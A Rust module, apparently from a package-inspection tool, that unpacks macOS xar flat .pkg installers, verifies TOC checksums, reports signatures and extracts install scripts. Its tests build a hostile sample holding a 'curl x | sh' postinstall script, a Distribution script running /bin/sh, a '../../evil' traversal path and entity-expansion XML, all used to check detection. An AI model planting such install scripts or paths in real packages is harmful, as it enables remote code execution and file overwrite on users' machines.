//! xar archives, the container behind macOS flat `.pkg` installers.
//!
//! Every member is returned as a child. Component `Scripts` archives (gzip'd
//! odc cpio) are additionally opened here so pre/post-install scripts surface
//! as [`crate::Script`]s; `Scripts` and `Payload` stay raw children for the
//! caller to recurse into. `Distribution` and `PackageInfo` XML feed metadata.
//! Signatures in the TOC are reported, not verified.

use sha1::{Digest, Sha1};

use crate::compress::{decompress, note_stream, zlib};
use crate::cpio::{is_cpio, read_into};
use crate::util::{Sink, shebang, slice, text, u16be, u64be, xml};
use crate::{ContainerKind, EntryKind, Expanded, FormatError, Limits};

const KIND: ContainerKind = ContainerKind::Xar;
/// Ceiling on the decompressed TOC; real ones are kilobytes.
const MAX_TOC_BYTES: u64 = 64 << 20;
const MAX_DEPTH: usize = 32;
const SCRIPT_NAMES: [&str; 6] = [
    "preinstall",
    "postinstall",
    "preflight",
    "postflight",
    "preupgrade",
    "postupgrade",
];

fn child<'a, 'i>(n: roxmltree::Node<'a, 'i>, name: &str) -> Option<roxmltree::Node<'a, 'i>> {
    n.children().find(|c| c.has_tag_name(name))
}

fn child_text(n: roxmltree::Node, name: &str) -> Option<String> {
    child(n, name).map(|c| c.text().unwrap_or("").trim().to_owned())
}

fn num(n: roxmltree::Node, name: &str) -> Option<u64> {
    child_text(n, name)?.parse().ok()
}

pub(crate) fn expand(bytes: &[u8], limits: &Limits) -> Result<Expanded, FormatError> {
    if !bytes.starts_with(b"xar!") {
        return Err(FormatError::malformed(KIND, "no xar magic"));
    }
    let bad = |m: &str| FormatError::malformed(KIND, m);
    let header_size = u16be(bytes, 4).ok_or_else(|| bad("truncated header"))? as usize;
    let toc_len = u64be(bytes, 8).ok_or_else(|| bad("truncated header"))?;
    let toc_raw_len = u64be(bytes, 16).ok_or_else(|| bad("truncated header"))?;
    if header_size < 28 {
        return Err(bad("header size too small"));
    }
    let toc_z = usize::try_from(toc_len)
        .ok()
        .and_then(|n| slice(bytes, header_size, n))
        .ok_or_else(|| bad("TOC extends past end of file"))?;
    let heap = header_size + toc_z.len();

    let mut sink = Sink::new(KIND, limits, bytes.len());
    let toc = zlib(toc_z, MAX_TOC_BYTES.min(sink.entry_cap(toc_len)));
    if toc.capped {
        return Err(bad("TOC exceeds size limit"));
    }
    if toc.data.is_empty() {
        return Err(bad(&format!(
            "TOC does not decompress: {}",
            toc.error.unwrap_or_default()
        )));
    }
    note_stream(&mut sink, &toc, "xar TOC");
    if toc.data.len() as u64 != toc_raw_len {
        sink.problem("xar: TOC uncompressed length does not match header");
    }
    let toc_text = String::from_utf8_lossy(&toc.data);
    let doc = xml(&toc_text).map_err(|e| bad(&format!("TOC XML: {e}")))?;
    let Some(toc_node) = child(doc.root_element(), "toc") else {
        return Err(bad("TOC has no <toc> element"));
    };

    verify_toc_checksum(&mut sink, toc_node, toc_z, bytes, heap);
    for sig in ["signature", "x-signature"] {
        if let Some(s) = child(toc_node, sig) {
            let certs = s
                .descendants()
                .filter(|d| d.has_tag_name("X509Certificate"))
                .count();
            let style = s.attribute("style").unwrap_or("unknown");
            sink.meta(
                "xar.signature",
                format!("{sig} style={style} certificates={certs}"),
            );
        }
    }

    let mut stack: Vec<(roxmltree::Node, String, usize)> = toc_node
        .children()
        .filter(|c| c.has_tag_name("file"))
        .map(|c| (c, String::new(), 0))
        .collect();
    stack.reverse();
    while let Some((node, parent, depth)) = stack.pop() {
        if sink.full() {
            break;
        }
        let name = child_text(node, "name").unwrap_or_default();
        let path = if parent.is_empty() {
            name
        } else {
            format!("{parent}/{name}")
        };
        let ftype = child_text(node, "type").unwrap_or_else(|| "file".into());
        let mode = child_text(node, "mode").and_then(|m| u32::from_str_radix(&m, 8).ok());
        let (kind, data) = match ftype.as_str() {
            "directory" => (EntryKind::Directory, Vec::new()),
            "symlink" => {
                let target = child_text(node, "link").unwrap_or_default();
                (EntryKind::Symlink { target }, Vec::new())
            }
            "hardlink" => {
                let target = child(node, "link")
                    .and_then(|l| l.attribute("link"))
                    .unwrap_or("")
                    .to_owned();
                (EntryKind::Hardlink { target }, Vec::new())
            }
            "file" => (
                EntryKind::File,
                file_data(&mut sink, node, bytes, heap, &path),
            ),
            other => (EntryKind::Special(other.to_owned()), Vec::new()),
        };
        if !sink.push(&path, kind, mode, data) {
            break;
        }
        if depth + 1 >= MAX_DEPTH {
            if node.children().any(|c| c.has_tag_name("file")) {
                sink.problem(format!(
                    "xar: nesting deeper than {MAX_DEPTH} at {path:?} skipped"
                ));
            }
            continue;
        }
        let mut kids: Vec<_> = node
            .children()
            .filter(|c| c.has_tag_name("file"))
            .map(|c| (c, path.clone(), depth + 1))
            .collect();
        kids.reverse();
        stack.extend(kids);
    }

    inspect_package(&mut sink);
    Ok(sink.finish())
}

/// The TOC's `<checksum>` points at a hash of the compressed TOC in the heap.
fn verify_toc_checksum(
    sink: &mut Sink,
    toc: roxmltree::Node,
    toc_z: &[u8],
    bytes: &[u8],
    heap: usize,
) {
    let Some(c) = child(toc, "checksum") else {
        return;
    };
    let style = c.attribute("style").unwrap_or("").to_ascii_lowercase();
    let (Some(off), Some(size)) = (num(c, "offset"), num(c, "size")) else {
        return;
    };
    let stored = usize::try_from(off)
        .ok()
        .zip(usize::try_from(size).ok())
        .and_then(|(o, s)| slice(bytes, heap.checked_add(o)?, s));
    let computed: Vec<u8> = match style.as_str() {
        "sha1" => Sha1::digest(toc_z).to_vec(),
        "sha256" => sha2::Sha256::digest(toc_z).to_vec(),
        "sha512" => sha2::Sha512::digest(toc_z).to_vec(),
        _ => {
            sink.meta("xar.toc_checksum", format!("{style} (not checked)"));
            return;
        }
    };
    match stored {
        Some(s) if s == computed.as_slice() => sink.meta("xar.toc_checksum", format!("{style} ok")),
        _ => {
            sink.meta("xar.toc_checksum", format!("{style} mismatch"));
            sink.problem("xar: TOC checksum does not match the heap copy (tampered or corrupt)");
        }
    }
}

/// Decode a `<file>`'s heap data per its `<encoding>`, within limits.
fn file_data(
    sink: &mut Sink,
    node: roxmltree::Node,
    bytes: &[u8],
    heap: usize,
    path: &str,
) -> Vec<u8> {
    let Some(d) = child(node, "data") else {
        return Vec::new();
    };
    let (Some(off), Some(len)) = (num(d, "offset"), num(d, "length")) else {
        sink.problem(format!("xar: {path:?} has incomplete <data>"));
        return Vec::new();
    };
    let raw = usize::try_from(off)
        .ok()
        .zip(usize::try_from(len).ok())
        .and_then(|(o, l)| slice(bytes, heap.checked_add(o)?, l));
    let Some(raw) = raw else {
        sink.problem(format!("xar: data for {path:?} lies outside the file"));
        return Vec::new();
    };
    let style = child(d, "encoding")
        .and_then(|e| e.attribute("style"))
        .unwrap_or("application/octet-stream");
    let cap = sink.entry_cap(len);
    let b = match style {
        "application/x-gzip" => zlib(raw, cap),
        "application/x-bzip2" => decompress(ContainerKind::Bzip2, raw, cap),
        "application/x-xz" => decompress(ContainerKind::Xz, raw, cap),
        "application/x-lzma" => {
            let b = decompress(ContainerKind::Xz, raw, cap);
            if b.data.is_empty() && b.error.is_some() {
                decompress(ContainerKind::Lzma, raw, cap)
            } else {
                b
            }
        }
        "application/octet-stream" => {
            let mut data = raw.to_vec();
            if data.len() as u64 > sink.entry_budget() {
                sink.truncate(format!("xar: {path:?} exceeds the entry size limit"));
                data.truncate(sink.entry_budget() as usize);
            }
            return data;
        }
        other => {
            sink.problem(format!(
                "xar: {path:?} uses unsupported encoding {other}; kept raw"
            ));
            return raw.to_vec();
        }
    };
    note_stream(sink, &b, &format!("xar {path}"));
    b.data
}

fn basename(p: &str) -> &str {
    p.rsplit('/').next().unwrap_or(p)
}

fn dirname(p: &str) -> &str {
    p.rsplit_once('/').map_or("", |(d, _)| d)
}

/// Derive metadata and scripts from `Distribution`, `PackageInfo`, `Scripts`
/// and `Payload` members already in the sink.
fn inspect_package(sink: &mut Sink) {
    let wanted: Vec<(String, Vec<u8>)> = sink
        .out
        .children
        .iter()
        .filter(|c| c.kind == EntryKind::File)
        .filter(|c| {
            matches!(
                basename(&c.path),
                "Distribution" | "PackageInfo" | "Scripts" | "Payload"
            )
        })
        .map(|c| (c.path.clone(), c.data.clone()))
        .collect();
    for (path, data) in wanted {
        match basename(&path) {
            "Distribution" => distribution(sink, &path, &data),
            "PackageInfo" => package_info(sink, &path, &data),
            "Scripts" => scripts(sink, &path, &data),
            _ => payload(sink, &path, &data),
        }
    }
}

fn distribution(sink: &mut Sink, path: &str, data: &[u8]) {
    let t = String::from_utf8_lossy(data);
    let doc = match xml(&t) {
        Ok(d) => d,
        Err(e) => return sink.problem(format!("pkg: {path} is not valid XML: {e}")),
    };
    let root = doc.root_element();
    if let Some(title) = child_text(root, "title") {
        sink.meta("pkg.distribution.title", title);
    }
    for n in root.descendants() {
        match n.tag_name().name() {
            "pkg-ref" if n.attribute("id").is_some() && n.attribute("version").is_some() => {
                let id = n.attribute("id").unwrap_or("");
                let ver = n.attribute("version").unwrap_or("");
                sink.meta("pkg.distribution.pkg-ref", format!("{id} {ver}"));
            }
            tag @ ("installation-check" | "volume-check") => {
                let script = n.attribute("script").unwrap_or("");
                sink.meta(format!("pkg.distribution.{tag}"), script.to_owned());
            }
            "script" => {
                let code = n.text().unwrap_or("").trim();
                if !code.is_empty() {
                    sink.script(
                        "pkg.distribution.js",
                        Some("javascript".into()),
                        path,
                        code.to_owned(),
                    );
                }
            }
            _ => {}
        }
    }
}

fn package_info(sink: &mut Sink, path: &str, data: &[u8]) {
    let t = String::from_utf8_lossy(data);
    let doc = match xml(&t) {
        Ok(d) => d,
        Err(e) => return sink.problem(format!("pkg: {path} is not valid XML: {e}")),
    };
    let root = doc.root_element();
    for attr in [
        "identifier",
        "version",
        "install-location",
        "auth",
        "postinstall-action",
    ] {
        if let Some(v) = root.attribute(attr) {
            sink.meta(format!("pkg.info.{attr}"), v.to_owned());
        }
    }
    if let Some(s) = child(root, "scripts") {
        for script in s.children().filter(|c| c.is_element()) {
            let file = script.attribute("file").unwrap_or("");
            sink.meta(
                format!("pkg.info.scripts.{}", script.tag_name().name()),
                file.to_owned(),
            );
        }
    }
}

/// Open a component `Scripts` archive and surface its lifecycle scripts.
fn scripts(sink: &mut Sink, path: &str, data: &[u8]) {
    let limits = *sink.limits;
    let mut tmp = Sink::new(KIND, &limits, data.len());
    let cpio = if data.starts_with(&[0x1f, 0x8b]) {
        let b = decompress(ContainerKind::Gzip, data, tmp.entry_cap(data.len() as u64));
        note_stream(&mut tmp, &b, path);
        b.data
    } else {
        data.to_vec()
    };
    if !is_cpio(&cpio) {
        return sink.problem(format!("pkg: {path} is not a (gzip'd) cpio archive"));
    }
    read_into(&cpio, &mut tmp, "");
    let tmp = tmp.finish();
    for p in tmp.problems {
        sink.problem(format!("{path}: {p}"));
    }
    let pkg = dirname(path);
    for c in tmp.children.iter().filter(|c| c.kind == EntryKind::File) {
        if let Some(name) = SCRIPT_NAMES.iter().find(|n| **n == c.path) {
            let body = text(&c.data);
            let at = if pkg.is_empty() {
                format!("Scripts/{name}")
            } else {
                format!("{pkg}/Scripts/{name}")
            };
            sink.script(&format!("pkg.{name}"), shebang(&body), &at, body);
        }
    }
}

fn payload(sink: &mut Sink, path: &str, data: &[u8]) {
    let format = if data.starts_with(b"pbzx") {
        sink.problem(format!(
            "pkg: {path} uses pbzx compression, which is not decoded"
        ));
        "pbzx"
    } else if data.starts_with(&[0x1f, 0x8b]) {
        "gzip"
    } else if is_cpio(data) {
        "cpio"
    } else {
        "unknown"
    };
    sink.meta("pkg.payload.format", format!("{path}: {format}"));
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;
    use crate::cpio::tests::odc;
    use std::io::Write;

    fn deflate(data: &[u8]) -> Vec<u8> {
        let mut e = flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::default());
        e.write_all(data).unwrap();
        e.finish().unwrap()
    }

    fn gz(data: &[u8]) -> Vec<u8> {
        let mut e = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        e.write_all(data).unwrap();
        e.finish().unwrap()
    }

    /// Minimal xar writer: each `(path, data)` becomes a zlib-encoded file;
    /// `path` components nest `<file>` elements.
    pub(crate) fn build(files: &[(&str, &[u8])], extra_toc: &str) -> Vec<u8> {
        let mut heap = vec![0u8; 20]; // sha1 slot for the TOC checksum
        let mut tree = String::new();
        let mut open: Vec<String> = Vec::new();
        for (i, (path, data)) in files.iter().enumerate() {
            let parts: Vec<&str> = path.split('/').collect();
            let (dirs, name) = parts.split_at(parts.len() - 1);
            while !(open.len() <= dirs.len() && open.iter().zip(dirs).all(|(a, b)| a == b)) {
                open.pop();
                tree.push_str("</file>");
            }
            for d in &dirs[open.len()..] {
                tree.push_str(&format!(
                    "<file id=\"d{i}{d}\"><name>{d}</name><type>directory</type>"
                ));
                open.push(d.to_string());
            }
            let z = deflate(data);
            tree.push_str(&format!(
                "<file id=\"{i}\"><name>{}</name><type>file</type><data><offset>{}</offset><length>{}</length><size>{}</size><encoding style=\"application/x-gzip\"/></data></file>",
                name[0],
                heap.len(),
                z.len(),
                data.len()
            ));
            heap.extend(z);
        }
        for _ in open {
            tree.push_str("</file>");
        }
        let toc = format!(
            "<?xml version=\"1.0\"?><xar><toc><checksum style=\"sha1\"><offset>0</offset><size>20</size></checksum>{extra_toc}{tree}</toc></xar>"
        );
        let toc_z = deflate(toc.as_bytes());
        heap[..20].copy_from_slice(&Sha1::digest(&toc_z));
        let mut out = b"xar!".to_vec();
        out.extend(28u16.to_be_bytes());
        out.extend(1u16.to_be_bytes());
        out.extend((toc_z.len() as u64).to_be_bytes());
        out.extend((toc.len() as u64).to_be_bytes());
        out.extend(1u32.to_be_bytes());
        out.extend(toc_z);
        out.extend(heap);
        out
    }

    pub(crate) fn sample() -> Vec<u8> {
        let dist = br#"<?xml version="1.0"?><installer-gui-script minSpecVersion="1"><title>Foo</title>
            <pkg-ref id="com.example.foo" version="1.2"/><installation-check script="check()"/>
            <script>function check() { return system.run('/bin/sh', '-c', 'id'); }</script></installer-gui-script>"#;
        let info = br#"<pkg-info identifier="com.example.foo" version="1.2" install-location="/Applications" auth="root" postinstall-action="none"><scripts><postinstall file="./postinstall"/></scripts></pkg-info>"#;
        let scripts = gz(&odc(&[
            (".", 0o040755, b""),
            ("./postinstall", 0o100755, b"#!/bin/bash\ncurl x | sh\n"),
        ]));
        let payload = gz(&odc(&[("./Applications/Foo.app", 0o040755, b"")]));
        build(
            &[
                ("Distribution", dist),
                ("foo.pkg/PackageInfo", info),
                ("foo.pkg/Scripts", &scripts),
                ("foo.pkg/Payload", &payload),
                ("../../evil", b"x"),
            ],
            "<signature style=\"RSA\"><KeyInfo><X509Data><X509Certificate>AA</X509Certificate><X509Certificate>BB</X509Certificate></X509Data></KeyInfo></signature>",
        )
    }

    #[test]
    fn expands_flat_pkg() {
        let out = expand(&sample(), &Limits::default()).unwrap();
        let paths: Vec<_> = out.children.iter().map(|c| c.path.as_str()).collect();
        assert_eq!(
            paths,
            [
                "Distribution",
                "foo.pkg",
                "foo.pkg/PackageInfo",
                "foo.pkg/Scripts",
                "foo.pkg/Payload",
                "__",
                "__/__",
                "__/__/evil"
            ]
        );
        assert!(out.problems.iter().any(|p| p.contains("traversal")));
        assert_eq!(out.meta("pkg.distribution.title"), Some("Foo"));
        assert_eq!(
            out.meta("pkg.distribution.pkg-ref"),
            Some("com.example.foo 1.2")
        );
        assert_eq!(
            out.meta("pkg.distribution.installation-check"),
            Some("check()")
        );
        assert_eq!(out.meta("pkg.info.identifier"), Some("com.example.foo"));
        assert_eq!(out.meta("pkg.info.auth"), Some("root"));
        assert_eq!(
            out.meta("pkg.info.scripts.postinstall"),
            Some("./postinstall")
        );
        assert_eq!(
            out.meta("pkg.payload.format"),
            Some("foo.pkg/Payload: gzip")
        );
        assert_eq!(out.meta("xar.toc_checksum"), Some("sha1 ok"));
        assert_eq!(
            out.meta("xar.signature"),
            Some("signature style=RSA certificates=2")
        );
        let post = out
            .scripts
            .iter()
            .find(|s| s.kind == "pkg.postinstall")
            .unwrap();
        assert_eq!(post.path, "foo.pkg/Scripts/postinstall");
        assert_eq!(post.interpreter.as_deref(), Some("/bin/bash"));
        assert!(post.text.contains("curl"));
        let js = out
            .scripts
            .iter()
            .find(|s| s.kind == "pkg.distribution.js")
            .unwrap();
        assert!(js.text.contains("system.run"));
    }

    #[test]
    fn detects_tampered_toc_checksum() {
        let mut b = sample();
        let toc_len = u64be(&b, 8).unwrap() as usize;
        b[28 + toc_len] ^= 0xff;
        let out = expand(&b, &Limits::default()).unwrap();
        assert_eq!(out.meta("xar.toc_checksum"), Some("sha1 mismatch"));
    }

    #[test]
    fn hostile_headers_and_truncation() {
        let good = sample();
        for n in 0..good.len() {
            let _ = expand(&good[..n], &Limits::default());
        }
        let mut lie = good.clone();
        lie[8..16].copy_from_slice(&u64::MAX.to_be_bytes());
        assert!(expand(&lie, &Limits::default()).is_err());
        let mut lie = good.clone();
        lie[16..24].copy_from_slice(&1u64.to_be_bytes());
        let out = expand(&lie, &Limits::default()).unwrap();
        assert!(
            out.problems
                .iter()
                .any(|p| p.contains("TOC uncompressed length"))
        );
        let mut flipped = good;
        for i in (30..flipped.len()).step_by(7) {
            flipped[i] ^= 0x5a;
            let _ = expand(&flipped, &Limits::default());
        }
    }

    #[test]
    fn deep_nesting_is_bounded() {
        let mut toc = String::from("<?xml version=\"1.0\"?><xar><toc>");
        for i in 0..40 {
            toc.push_str(&format!(
                "<file id=\"{i}\"><name>d</name><type>directory</type>"
            ));
        }
        toc.push_str(&"</file>".repeat(40));
        toc.push_str("</toc></xar>");
        let z = deflate(toc.as_bytes());
        let mut b = b"xar!".to_vec();
        b.extend(28u16.to_be_bytes());
        b.extend(1u16.to_be_bytes());
        b.extend((z.len() as u64).to_be_bytes());
        b.extend((toc.len() as u64).to_be_bytes());
        b.extend(0u32.to_be_bytes());
        b.extend(z);
        let out = expand(&b, &Limits::default()).unwrap();
        assert_eq!(out.children.len(), MAX_DEPTH);
        assert!(out.problems.iter().any(|p| p.contains("nesting")));
    }

    #[test]
    fn hostile_xml_nesting_is_rejected_not_overflowed() {
        let deep = format!("{}{}", "<a>".repeat(100_000), "</a>".repeat(100_000));
        assert!(xml(&deep).unwrap_err().contains("nesting"));
        let tricky = "<a x='>' y=\"/>\"><!-- <b> --><![CDATA[<c>]]><?pi <d>?><e/></a>";
        assert_eq!(crate::util::xml_depth(tricky.as_bytes()), 1);
        assert!(xml(tricky).is_ok());
        let plist = r#"<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist/>"#;
        assert!(xml(plist).is_ok());
        let laughs = r#"<!DOCTYPE x [<!ENTITY a "aaaa">]><x>&a;</x>"#;
        assert!(xml(laughs).is_err());
    }

    /// Manual validation against a real flat package:
    /// `BYTEBOUNCER_PKG_SAMPLE=/path/x.pkg cargo test -- --ignored real_pkg`.
    #[test]
    #[ignore]
    fn real_pkg() {
        let path = std::env::var("BYTEBOUNCER_PKG_SAMPLE").expect("set BYTEBOUNCER_PKG_SAMPLE");
        let out = expand(&std::fs::read(path).unwrap(), &Limits::default()).unwrap();
        for c in &out.children {
            eprintln!("{} {:?} {}", c.path, c.kind, c.data.len());
        }
        eprintln!("{:#?}\n{:#?}", out.metadata, out.problems);
        for s in &out.scripts {
            eprintln!("{} {} {:?}", s.kind, s.path, s.interpreter);
        }
        assert!(!out.children.is_empty());
    }
}
